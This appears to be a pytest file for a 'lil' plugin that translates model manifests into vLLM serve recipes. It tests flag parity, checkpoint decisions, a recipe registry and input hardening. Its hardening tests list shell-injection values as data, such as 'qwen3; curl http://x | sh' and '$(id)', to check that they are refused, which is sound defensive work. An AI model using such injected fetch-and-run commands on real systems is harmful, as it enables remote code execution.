"""The lil plugin: manifest layering, checkpoint decisions, translation parity, and the @lil registry.

``test_matches_lil_render`` is the parity contract. The fixtures under
``tests/fixtures/lil/`` hold, per catalog entry, the manifest, its checkpoint's
``config.json`` and stored weight size, and what the lil launcher itself
rendered (``lil render --format json``) on an 8-node DGX Spark topology.
sparkrun's translation, rendered through the ordinary vLLM runtime with the
recipe's overrides applied for that many GB10 hosts, must produce the same
serve flags. Re-capture with ``.slop/lil_capture_golden.py``, which needs a
built lil binary and the network, when the catalog or the launcher moves.
"""

from __future__ import annotations

import hashlib
import json
import shlex
import shutil
from pathlib import Path

import pytest
import yaml

from sparkrun.plugins import lil
from sparkrun.plugins.lil import checkpoint as ckpt
from sparkrun.plugins.lil.manifest import (
    BASES_PATH,
    BASES_UPSTREAM,
    LilManifestError,
    deep_merge,
    load_entry,
    read_git_head,
)
from sparkrun.plugins.lil.translate import CheckpointFacts, translate

FIXTURES = Path(__file__).parent / "fixtures" / "lil"
GOLDEN = sorted(p.parent for p in FIXTURES.glob("*/expected.json"))

#: Flags sparkrun owns for every runtime (binding, rendezvous) or deliberately
#: leaves to the platform on unified memory (--gpu-memory-utilization).
_SPARKRUN_OWNED = {
    "--host",
    "--port",
    "--nnodes",
    "--node-rank",
    "--master-addr",
    "--master-port",
    "--headless",
    "--pipeline-parallel-size",
    "--data-parallel-size",
    "--decode-context-parallel-size",
    "--dcp-comm-backend",
    "--gpu-memory-utilization",
}


def _flags(argv: list[str]) -> dict[str, list]:
    out: dict[str, list] = {}
    i = 0
    while i < len(argv):
        arg = argv[i]
        if arg.startswith("-"):
            key = {"-tp": "--tensor-parallel-size", "-pp": "--pipeline-parallel-size"}.get(arg, arg)
            if arg.startswith("--") and "=" in arg:
                name, value = arg.split("=", 1)
                out.setdefault(name, []).append(value)
            elif i + 1 < len(argv) and not argv[i + 1].startswith("--"):
                out.setdefault(key, []).append(argv[i + 1])
                i += 1
            else:
                out.setdefault(key, []).append(True)
        i += 1
    return out


def _value(v):
    if isinstance(v, str) and v[:1] in "{[":
        try:
            return json.loads(v)
        except ValueError:
            return v
    return v


def _normalize_lil(flags: dict[str, list], tp: int) -> dict[str, list]:
    """Spellings that are equivalent, not different."""
    dotted = {k.split(".", 1)[1]: v[0] for k, v in flags.items() if k.startswith("--default-chat-template-kwargs.")}
    flags = {k: v for k, v in flags.items() if not k.startswith("--default-chat-template-kwargs.")}
    if dotted:  # lil passes chat-template kwargs as dotted flags; we pass the same mapping as JSON
        flags["--default-chat-template-kwargs"] = [json.dumps({k: {"true": True, "false": False}.get(v, v) for k, v in dotted.items()})]
    specs = []
    for spec in flags.get("--speculative-config", []):
        config = json.loads(spec)
        if config.get("draft_tensor_parallel_size") == tp:  # vLLM's own default
            config.pop("draft_tensor_parallel_size")
        specs.append(json.dumps(config))
    if specs:
        flags["--speculative-config"] = specs
    if tp == 1:  # nothing to all-reduce on one GPU
        flags.pop("--disable-custom-all-reduce", None)
    return flags


def _fixture_facts(directory: Path) -> CheckpointFacts:
    expected = json.loads((directory / "expected.json").read_text())
    return CheckpointFacts(config=json.loads((directory / "config.json").read_text()), weight_bytes=expected["weight_bytes"])


def _render(data: dict, tp: int) -> list[str]:
    from sparkrun.core.cluster_manager import ClusterDefinition
    from sparkrun.core.recipe import Recipe
    from sparkrun.core.recipe_overrides import apply_recipe_override_layers, build_override_context
    from sparkrun.runtimes.vllm_distributed import VllmDistributedRuntime

    recipe = Recipe.from_dict(data)
    runtime = VllmDistributedRuntime()
    hosts = ["spark-%d" % i for i in range(tp)]
    context = build_override_context(
        recipe, runtime=runtime, cluster=ClusterDefinition(name="c", hosts=hosts), hosts=hosts, host_hardware={}
    )
    apply_recipe_override_layers(recipe, context)
    return shlex.split(runtime.generate_command(recipe, {}, is_cluster=tp > 1))


# --- parity with the lil launcher ------------------------------------------------------------------


def test_golden_fixtures_are_present():
    assert len(GOLDEN) >= 8


@pytest.mark.parametrize("directory", GOLDEN, ids=[p.name for p in GOLDEN])
def test_matches_lil_render(directory):
    expected = json.loads((directory / "expected.json").read_text())
    recipe = translate(load_entry(directory / "lil.yaml"), _fixture_facts(directory))
    tp = recipe["defaults"]["tensor_parallel"]
    assert tp == expected["tensor_parallel_size"], "fit TP differs from lil's"

    ours = _flags(_render(recipe, tp)[3:])
    theirs = _normalize_lil(_flags(expected["vllm_argv"][2:]), tp)
    differences = {
        flag: {"lil": [_value(v) for v in theirs.get(flag, [])], "sparkrun": [_value(v) for v in ours.get(flag, [])]}
        for flag in sorted(set(ours) | set(theirs))
        if flag not in _SPARKRUN_OWNED and [_value(v) for v in theirs.get(flag, [])] != [_value(v) for v in ours.get(flag, [])]
    }
    assert differences == {}


def test_unified_memory_keeps_the_platform_memory_utilization():
    """lil's discrete-card utilization must not reach GB10; on other hardware it applies."""
    directory = FIXTURES / "DeepSeek-V4-Flash-0731"
    recipe = translate(load_entry(directory / "lil.yaml"), _fixture_facts(directory))
    assert "--gpu-memory-utilization" not in _render(recipe, 2)
    [override] = [o for o in recipe["overrides"] if o["when"] == {"capability": {"ne": "unified-memory"}}]
    assert override["defaults"]["gpu_memory_utilization"] == 0.975


# --- manifests ------------------------------------------------------------------------------------------


def test_vendored_bases_match_their_recorded_upstream():
    """Drift guard: update BASES_UPSTREAM together with bases.yaml."""
    assert hashlib.sha256(BASES_PATH.read_bytes()).hexdigest() == BASES_UPSTREAM["sha256"]


def test_deep_merge_follows_lil_rules():
    merged = deep_merge({"a": {"x": 1, "y": 2}, "l": [1], "n": 1}, {"a": {"y": 3}, "l": [2], "n": None})
    assert merged == {"a": {"x": 1, "y": 3}, "l": [2], "n": None}  # explicit null replaces, it does not delete


def test_family_and_defaults_layer_under_the_entry():
    entry = load_entry(FIXTURES / "GLM-5.3-Flash-NVFP4-Spark" / "lil.yaml")
    assert entry.family == "glm"
    assert entry.section("serving")["reasoning_parser"] == "glm45"  # from the family
    assert entry.section("serving")["prefill_policy"] == "decode-aware"  # from the global defaults
    assert entry.section("environment")["VLLM_SSM_CONV_STATE_LAYOUT"] == "DS"  # from the entry


def _manifest(tmp_path: Path, name: str, **data) -> Path:
    body = {"schema_version": 1, "kind": "model", "model": "org/model", "description": "d", "serving": {"served_model_name": "m"}}
    body.update(data)
    path = tmp_path / name / "lil.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(yaml.safe_dump(body))
    return path


@pytest.mark.parametrize(
    "fields,match",
    [
        ({"schema_version": 2}, "schema_version"),
        ({"kind": "draft"}, "drafts are not launchable"),
        ({"model": "not-a-repo"}, "owner/name"),
        ({"revision": "main"}, "40-character"),
        ({"family": "nope"}, "unknown model family"),
        ({"serving": {}}, "served_model_name"),
    ],
)
def test_invalid_manifests_are_rejected(tmp_path, fields, match):
    with pytest.raises(LilManifestError, match=match):
        load_entry(_manifest(tmp_path, "Bad", **fields))


def test_catalog_enumeration_skips_drafts_and_broken_entries(tmp_path):
    _manifest(tmp_path, "Model")
    _manifest(tmp_path, "Draft", kind="draft")
    (tmp_path / "Broken").mkdir()
    (tmp_path / "Broken" / "lil.yaml").write_text(":\n  - [")
    assert [p.parent.name for p in lil.iter_manifests(tmp_path)] == ["Model"]


def test_claims_only_launchable_lil_manifests(tmp_path):
    path = _manifest(tmp_path, "Model")
    assert lil.claims(path, yaml.safe_load(path.read_text()))
    assert not lil.claims(path.with_name("other.yaml"), yaml.safe_load(path.read_text()))
    assert not lil.claims(path, {"schema_version": 1, "kind": "draft"})


def test_git_head_is_read_without_running_git(tmp_path):
    sha = "a" * 40
    (tmp_path / ".git" / "refs" / "heads").mkdir(parents=True)
    (tmp_path / ".git" / "HEAD").write_text("ref: refs/heads/main\n")
    assert read_git_head(tmp_path) is None
    (tmp_path / ".git" / "packed-refs").write_text("# pack-refs\n%s refs/heads/main\n" % sha)
    assert read_git_head(tmp_path) == sha
    (tmp_path / ".git" / "refs" / "heads" / "main").write_text("b" * 40 + "\n")
    assert read_git_head(tmp_path) == "b" * 40


# --- checkpoint decisions -------------------------------------------------------------------------------


def test_cudagraph_sizes_cover_mtp_verification():
    sizes = ckpt.cudagraph_capture_sizes(max_num_seqs=4, max_num_batched_tokens=4096, query_len=4, mixed_multiplier=2)
    assert {4, 8, 12, 16} <= set(sizes) and max(sizes) == 32 and sizes == sorted(sizes)


def test_verification_shape_per_speculator():
    assert ckpt.verification_shape("mtp", 3) == (4, 2)
    assert ckpt.verification_shape("dspark", 5) == (6, 1)
    assert ckpt.verification_shape("dflash", 7) == (1, 2)
    assert ckpt.verification_shape("mtp", 0) == (1, 2)


def test_fit_tp_is_the_smallest_divisor_that_fits():
    gib = 1 << 30
    assert ckpt.fit_tensor_parallel(heads=64, weight_bytes=50 * gib, device_bytes=121 * gib, utilization=0.9, max_tp=8) == 1
    assert ckpt.fit_tensor_parallel(heads=64, weight_bytes=150 * gib, device_bytes=121 * gib, utilization=0.9, max_tp=8) == 2
    assert ckpt.fit_tensor_parallel(heads=6, weight_bytes=150 * gib, device_bytes=121 * gib, utilization=0.9, max_tp=8) == 2
    assert ckpt.fit_tensor_parallel(heads=64, weight_bytes=5000 * gib, device_bytes=121 * gib, utilization=0.9, max_tp=8) is None


def _mtp_config(quant_algo: str) -> dict:
    return {
        "num_hidden_layers": 4,
        "num_nextn_predict_layers": 1,
        "quantization_config": {"quantized_layers": {"model.layers.4.mlp.experts.0": {"quant_algo": quant_algo}}},
    }


@pytest.mark.parametrize("algo,backend", [("NVFP4", "b12x"), ("MXFP8", "humming"), ("mxfp4", "b12x")])
def test_mtp_backend_from_quantized_layers(algo, backend):
    assert ckpt.mtp_backend_from_config(_mtp_config(algo), "bfloat16").backend == backend


def test_mtp_backend_for_deepseek_block_fp8():
    config = {"quantization_config": {"quant_method": "fp8"}, "expert_dtype": "fp4"}
    assert ckpt.mtp_backend_from_config(config, "bfloat16") == ckpt.MTPBackendDecision(
        "mxfp4", "b12x", ("quantization_config.quant_method=fp8 with expert_dtype=fp4",)
    )


def test_mtp_backend_conflicts_and_mismatches_raise():
    config = _mtp_config("NVFP4")
    config["quantization_config"]["quantized_layers"]["model.layers.4.mlp.experts.1"] = {"quant_algo": "MXFP8"}
    with pytest.raises(ckpt.CheckpointDecisionError, match="conflicting"):
        ckpt.mtp_backend_from_config(config, "bfloat16")
    with pytest.raises(ckpt.CheckpointDecisionError, match="mismatch"):
        ckpt.mtp_backend_decision({"moe_quantization": "mxfp8"}, _mtp_config("NVFP4"), "bfloat16")


def test_mtp_backend_declarations_win_and_fill_gaps():
    assert ckpt.mtp_backend_decision({"moe_backend": "custom"}, _mtp_config("NVFP4"), "bfloat16").backend == "custom"
    assert ckpt.mtp_backend_decision({"moe_quantization": "mxfp8"}, None, "bfloat16").backend == "humming"  # no checkpoint
    assert ckpt.mtp_backend_decision({}, None, "bfloat16") is None  # nothing known: leave vLLM's choice


# --- translation behaviour ------------------------------------------------------------------------------


def test_translation_is_a_plain_v2_recipe_for_the_b12x_image():
    directory = FIXTURES / "Qwen3.8-Flash-Next-NVFP4"
    recipe = translate(load_entry(directory / "lil.yaml"), _fixture_facts(directory))
    assert recipe["recipe_version"] == "2" and recipe["runtime"] == "vllm-distributed"
    assert recipe["container"].startswith("ghcr.io/spark-arena/dgx-vllm-eugr-nightly-b12x")
    assert recipe["metadata"]["source"] == "lil"
    assert "CUTE_DSL_ARCH" not in recipe["env"] and not any(k.startswith("NCCL_") for k in recipe["env"])


def test_speculators_are_selectable_and_can_be_turned_off():
    directory = FIXTURES / "GLM-5.3-Flash-NVFP4-Spark"
    recipe = translate(load_entry(directory / "lil.yaml"), _fixture_facts(directory))
    assert recipe["defaults"]["speculator"] == "mtp"
    by_method = {o["when"]["config"]["speculator"]: o["defaults"] for o in recipe["overrides"] if "config" in o["when"]}
    assert by_method["dflash"]["speculative_config"]["method"] == "dflash"
    assert by_method["dflash"]["speculative_config"]["model"] == "local-inference-lab/GLM-5.3-Flash-DFlash2"
    assert by_method["none"]["speculative_config"] is None
    dflash_argv = " ".join(_render({**recipe, "defaults": {**recipe["defaults"], "speculator": "dflash"}}, 2))
    assert '"method":"dflash"' in dflash_argv


def test_pinned_revision_reaches_the_engine():
    directory = FIXTURES / "DeepSeek-V4-Flash-0731"
    recipe = translate(load_entry(directory / "lil.yaml"), _fixture_facts(directory))
    argv = _render(recipe, 2)
    assert argv[argv.index("--revision") + 1] == recipe["model_revision"]


def test_offline_translation_needs_no_facts_and_never_raises(tmp_path):
    """Listing: no network, and a missing checkpoint degrades instead of failing."""
    recipe = translate(load_entry(FIXTURES / "GLM-5.3-Flash-NVFP4" / "lil.yaml"), CheckpointFacts(), strict=False)
    assert "tensor_parallel" not in recipe["defaults"]
    assert recipe["defaults"]["speculative_config"]["moe_backend"] == "humming"  # from the manifest's declared quantization


def test_offline_facts_never_reach_the_network(monkeypatch):
    import sparkrun.models.vram as vram

    def _refuse(*_a, **_kw):
        raise AssertionError("offline listing must not call the Hub")

    monkeypatch.setattr(vram, "hub_metadata_call", _refuse)
    monkeypatch.setattr(vram, "fetch_safetensors_size", _refuse)
    facts = lil.gather_facts("org/not-cached", None, offline=True)
    assert facts == CheckpointFacts(config=None, weight_bytes=None)


# --- the @lil registry -----------------------------------------------------------------------------------


@pytest.fixture
def lil_registry(tmp_path, monkeypatch):
    """A cached lil catalog behind the plugin-declared @lil registry, facts from fixtures."""
    from sparkrun.core.registry import RegistryManager

    config, cache = tmp_path / "config", tmp_path / "cache"
    config.mkdir()
    cache.mkdir()
    lil.register(None)
    mgr = RegistryManager(config, cache)
    mgr._manifest_discovery_attempted = True
    mgr._save_registries([])
    checkout = cache / "lil"
    (checkout / ".git").mkdir(parents=True)
    for directory in GOLDEN:
        (checkout / directory.name).mkdir()
        shutil.copy(directory / "lil.yaml", checkout / directory.name / "lil.yaml")
    models = {yaml.safe_load((d / "lil.yaml").read_text())["model"]: _fixture_facts(d) for d in GOLDEN}
    monkeypatch.setattr(lil, "gather_facts", lambda model, revision, *, offline: models[model] if not offline else CheckpointFacts())
    return mgr


def test_lil_registry_is_declared_with_the_repo_root(lil_registry):
    [entry] = [e for e in lil_registry._load_registries() if e.name == "lil"]
    assert (entry.subpath, entry.format, entry.declared_by) == ("/", "lil", "lil")


def test_lil_entries_list_and_resolve_by_name(lil_registry):
    from sparkrun.core.recipe import Recipe, find_recipe

    names = {r["name"] for r in lil_registry.search_recipes("")}
    assert "@lil/Qwen3.8-27B-NVFP4-QAD" in names and "@lil/GLM-5.3-Flash-NVFP4" in names
    path = find_recipe("@lil/Qwen3.8-27B-NVFP4-QAD", registry_manager=lil_registry)
    recipe = Recipe.load(path, registry_manager=lil_registry)
    assert recipe.name == "Qwen3.8-27B-NVFP4-QAD"
    assert recipe.model == "local-inference-lab/Qwen3.8-27B-NVFP4-QAD"
    assert recipe.defaults["tensor_parallel"] == 1
    assert recipe.metadata["lil"]["entry"] == "Qwen3.8-27B-NVFP4-QAD"


def test_exported_lil_recipe_is_self_contained_and_reloads(lil_registry, tmp_path):
    from sparkrun.core.recipe import Recipe, find_recipe
    from sparkrun.orchestration.job_metadata import derive_recipe_fingerprint

    recipe = Recipe.load(find_recipe("@lil/DeepSeek-V4-Flash-0731", registry_manager=lil_registry), registry_manager=lil_registry)
    exported = tmp_path / "exported.yaml"
    exported.write_text(recipe.export())
    reloaded = Recipe.load(exported)
    document = yaml.safe_load(exported.read_text())
    assert document["model_revision"] == recipe.model_revision
    assert None not in document["defaults"].values()  # nulls only belong in override layers
    assert derive_recipe_fingerprint(reloaded) == derive_recipe_fingerprint(recipe)


def test_plugin_is_bound_to_an_alpha_feature_flag():
    from sparkrun.core.features import get_feature
    from sparkrun.core.in_tree_plugins import plugin_feature_flag

    assert plugin_feature_flag("lil") == lil.FEATURE_FLAG
    flag = get_feature(lil.FEATURE_FLAG)
    assert flag is not None and flag.default is False and flag.channel_defaults.get("alpha") is True


# --- review hardening ----------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "env,match",
    [
        ({"PYTHONPATH": "/cache/huggingface/hub/models--x/snapshots/y"}, "managed by the launcher"),
        ({"LD_PRELOAD": "/tmp/x.so"}, "managed by the launcher"),
        ({"NCCL_SOCKET_IFNAME": "eth9"}, "managed by the launcher"),
        ({"NCCL_ANYTHING": "1"}, "managed by the launcher"),
        ({"HF_HUB_OFFLINE": "0"}, "managed by the launcher"),
        ({"bad-name": "1"}, "invalid variable name"),
        ({"OK_NAME": 32}, "must be strings"),
        ({"OK_NAME": "a\nb"}, "single line"),
    ],
)
def test_manifest_environment_is_held_to_lil_rules(tmp_path, env, match):
    entry = load_entry(_manifest(tmp_path, "Env", environment=env))
    with pytest.raises(LilManifestError, match=match):
        translate(entry, CheckpointFacts(), strict=False)


def test_manifest_override_environment_is_checked_too(tmp_path):
    entry = load_entry(_manifest(tmp_path, "Env", overrides=[{"when": {"tp": 1}, "environment": {"LD_LIBRARY_PATH": "/x"}}]))
    with pytest.raises(LilManifestError, match="managed by the launcher"):
        translate(entry, CheckpointFacts(), strict=False)


@pytest.mark.parametrize("value", ["qwen3; curl http://x | sh", "$(id)", "a b", "`id`", "x&&y"])
def test_plain_values_that_are_shell_syntax_are_refused(tmp_path, value):
    """Plain strings reach the bash serve command unquoted."""
    entry = load_entry(_manifest(tmp_path, "Shell", serving={"served_model_name": "m", "reasoning_parser": value}))
    with pytest.raises(LilManifestError, match="not a plain value"):
        translate(entry, CheckpointFacts(), strict=False)


def test_dflash_model_must_be_a_repo_id(tmp_path):
    entry = load_entry(_manifest(tmp_path, "Draft", speculators={"default": "dflash", "dflash": {"tokens": 3, "model": "../../x"}}))
    with pytest.raises(LilManifestError, match="Hugging Face model id"):
        translate(entry, CheckpointFacts(), strict=False)


def test_catalog_entries_symlinked_outside_are_ignored(tmp_path):
    outside = _manifest(tmp_path / "elsewhere", "Real")
    catalog = tmp_path / "catalog"
    catalog.mkdir()
    (catalog / "Linked").symlink_to(outside.parent)
    _manifest(catalog, "Inside")
    assert [p.parent.name for p in lil.iter_manifests(catalog)] == ["Inside"]


def test_facts_are_recorded_once_known_so_identity_is_stable(monkeypatch):
    """TP is identity: a later load (stop/logs) must see the launch's facts even with the Hub gone."""
    import sparkrun.models.vram as vram

    monkeypatch.setattr(vram, "fetch_model_config", lambda *a, **k: {"num_attention_heads": 32})
    monkeypatch.setattr(vram, "fetch_safetensors_size", lambda *a, **k: 123)
    first = lil.gather_facts("org/m", "a" * 40, offline=False)

    def _gone(*_a, **_k):
        raise AssertionError("the recorded facts must answer")

    monkeypatch.setattr(vram, "fetch_model_config", _gone)
    monkeypatch.setattr(vram, "fetch_safetensors_size", _gone)
    assert lil.gather_facts("org/m", "a" * 40, offline=True) == first == CheckpointFacts({"num_attention_heads": 32}, 123)


def test_incomplete_facts_are_not_recorded(monkeypatch):
    import sparkrun.models.vram as vram

    monkeypatch.setattr(vram, "fetch_model_config", lambda *a, **k: {"num_attention_heads": 32})
    monkeypatch.setattr(vram, "fetch_safetensors_size", lambda *a, **k: None)
    lil.gather_facts("org/partial", None, offline=False)
    monkeypatch.setattr(vram, "fetch_safetensors_size", lambda *a, **k: 7)
    assert lil.gather_facts("org/partial", None, offline=False).weight_bytes == 7


def test_local_snapshot_is_sized_by_shard_files_and_only_when_complete(tmp_path, monkeypatch):
    snapshot = tmp_path / "snap"
    snapshot.mkdir()
    (snapshot / "config.json").write_text("{}")
    (snapshot / "model.safetensors.index.json").write_text(
        json.dumps({"metadata": {"total_size": 1}, "weight_map": {"a": "s1.safetensors", "b": "s2.safetensors"}})
    )
    (snapshot / "s1.safetensors").write_bytes(b"x" * 10)
    import sparkrun.models.vram as vram

    monkeypatch.setattr(vram, "cached_hub_file", lambda *a, **k: str(snapshot / "config.json"))
    assert lil._local_weight_bytes("org/m", None, None) is None  # s2 missing: a partial download
    (snapshot / "s2.safetensors").write_bytes(b"x" * 5)
    assert lil._local_weight_bytes("org/m", None, None) == 15  # file sizes, not the index's total_size
